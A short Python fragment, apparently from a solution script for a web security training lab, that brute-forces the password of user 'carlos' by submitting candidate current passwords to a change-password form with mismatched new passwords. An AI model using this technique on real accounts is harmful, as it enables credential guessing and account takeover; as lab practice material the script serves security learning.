...
def access_carlos_account(s, url):
    ...
    for pwd in lines:
        pwd = pwd.strip('\n')
        change_password_data = {"username":"carlos","current-password": pwd, "new-password-1": "not-match-password-1", "new-password-2": "not-match-password-2"}
        r = s.post(change_password_url, data=change_password_data, verify=False, proxies=proxies)
        print(f"Test login wtih: username:carlos & password:{pwd}")
